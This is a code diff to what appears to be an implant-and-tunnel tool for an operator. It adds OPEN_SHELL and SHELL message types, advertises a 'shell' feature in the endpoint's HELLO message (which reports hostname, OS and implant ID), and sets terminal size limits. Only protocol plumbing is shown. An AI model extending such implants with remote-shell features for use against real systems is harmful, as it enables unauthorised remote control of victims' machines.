@@ -1230,6 +1230,8 @@ MSG_OPEN_RELAY = 3
 MSG_PING = 4
 MSG_PONG = 5
 MSG_CLOSE = 6
+MSG_OPEN_SHELL = 7
+MSG_SHELL = 8
 
 MESSAGE_KIND_NAMES = {
     MSG_HELLO: "HELLO",
@@ -1238,9 +1240,25 @@ MESSAGE_KIND_NAMES = {
     MSG_PING: "PING",
     MSG_PONG: "PONG",
     MSG_CLOSE: "CLOSE",
+    MSG_OPEN_SHELL: "OPEN_SHELL",
+    MSG_SHELL: "SHELL",
 }
 
 MESSAGE_KINDS = tuple(sorted(MESSAGE_KIND_NAMES))
+
+# What an endpoint of this build can do beyond the relay, as HELLO lists it.
+# The server sends a feature's messages only to an endpoint that named it,
+# because a build that predates one ends its control loop on meeting a kind
+# it does not know.
+TUNNEL_FEATURES = ("shell",)
+
+# The terminal a shell session opens with when the operator names none, and
+# the largest either end accepts. Both ends clamp against these -- the
+# endpoint before its ioctl, the front before it asks for a session -- so
+# they live here with the codec and not in either of them.
+SHELL_DEFAULT_COLS = 120
+SHELL_DEFAULT_ROWS = 40
+SHELL_GEOMETRY_MAX = 1000
 
 
 def _code_list(table: dict) -> str:
@@ -3281,11 +3299,16 @@ class TunnelEndpoint(object):
         and "a scan through this tunnel is slow" is otherwise debugged as
         a fault in the target's own network for an afternoon. The server
         knows its own path and cannot know this one.
+
+        `features` is what this build can do besides relay, so the server
+        can tell an endpoint that has a shell from one built before it
+        did. A HELLO without the field is a build that predates it.
         """
         body = {"identity": self.identity,
                 "hostname": platform.node(),
                 "os": "%s %s" % (platform.system(), platform.release()),
-                "crypto": self._crypto_path()}
+                "crypto": self._crypto_path(),
+                "features": list(TUNNEL_FEATURES)}
         if self.implant_id:
             body["implant_id"] = self.implant_id
         return body
